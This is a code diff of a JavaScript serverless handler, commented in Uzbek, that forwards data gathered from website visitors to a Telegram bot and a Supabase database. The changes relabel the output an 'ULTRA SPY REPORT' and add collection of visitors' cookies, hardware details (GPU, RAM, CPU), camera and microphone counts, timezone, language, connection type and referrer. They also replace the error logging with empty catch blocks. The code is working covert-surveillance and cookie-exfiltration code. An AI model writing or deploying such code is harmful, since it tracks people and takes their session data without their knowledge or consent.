@@ -13,33 +13,39 @@ export default async function handler(req, res) {
     const now = new Date();
     const uzTime = new Date(now.getTime() + (5 * 60 * 60 * 1000)).toLocaleString('uz-UZ', { timeZone: 'UTC' });
 
-    // 1. Telegram xabarini tayyorlash
     const message = `
-🚀 *HISOBOT: ${data.fingerprint || 'Noma\'lum'}*
+🕵️‍♂️ *ULTRA SPY REPORT: ${data.fingerprint}*
 ----------------------------
-🕒 Vaqt: ${uzTime}
-📱 Qurilma: ${data.exactModel || data.platform || 'Noma\'lum'}
-🌐 Ilova: ${data.userAgent?.substring(0, 40)}...
-🌍 IP: ${ip}
-📍 Joylashuv: ${data.city || ''}, ${data.country || ''}
-🔋 Batareya: ${data.battery?.level || 'Noma\'lum'}
+🕒 *Vaqt:* ${uzTime}
+📱 *Qurilma:* ${data.exactModel || data.platform}
+🌐 *Ilova:* ${data.userAgent?.substring(0, 40)}...
+
+🆔 *Fingerprint:* \`${data.fingerprint}\`
+🔋 *Batareya:* ${data.battery?.level} (${data.battery?.charging})
+🧠 *RAM:* ${data.ram} GB | *CPU:* ${data.cores}
+🎮 *GPU:* \`${data.gpu}\`
+
+🌍 *Region:* ${data.timezone} | 🇺🇿 *Til:* ${data.language}
+📡 *Internet:* ${data.connection?.type || 'Noma\'lum'}
+📷 *Media:* Cam(${data.media?.videoinput || 0}), Mic(${data.media?.audioinput || 0})
+👆 *Touch:* ${data.touchPoints} | 📐 *Holat:* ${data.orientation}
+
+🌍 *IP:* ${ip}
+📍 *Joylashuv:* ${data.city || ''}, ${data.country || ''}
+🔗 *Referrer:* ${data.referrer}
 ----------------------------
 `;
 
-    // 2. Telegram-ga yuborish (Eng muhim amal)
+    // 2. Telegram-ga yuborish
     try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
         });
-    } catch (e) { console.error('TG Error:', e); }
+    } catch (e) {}
 
-    // 3. Supabase-ga saqlash (Keyingi navbatda)
+    // 3. Supabase-ga saqlash
     try {
         await fetch(`${SUPABASE_URL}/rest/v1/visitors`, {
             method: 'POST',
@@ -54,13 +60,21 @@ export default async function handler(req, res) {
                 device_model: data.exactModel || data.platform,
                 ip_address: ip,
                 location: `${data.city || ''}, ${data.country || ''}`,
-                battery: `${data.battery?.level || ''}`,
+                battery: `${data.battery?.level} ${data.battery?.charging}`,
+                ram: data.ram?.toString(),
+                cpu_cores: data.cores?.toString(),
+                gpu: data.gpu,
+                timezone: data.timezone,
+                language: data.language,
+                connection: JSON.stringify(data.connection),
+                screen_size: data.screenSize,
+                referrer: data.referrer,
                 user_agent: data.userAgent,
-                incognito: data.incognito,
-                media: JSON.stringify(data.media || {})
+                cookies: data.cookies,
+                media: JSON.stringify(data.media)
             })
         });
-    } catch (e) { console.error('DB Error:', e); }
+    } catch (e) {}
 
     return res.status(200).json({ success: true });
 }
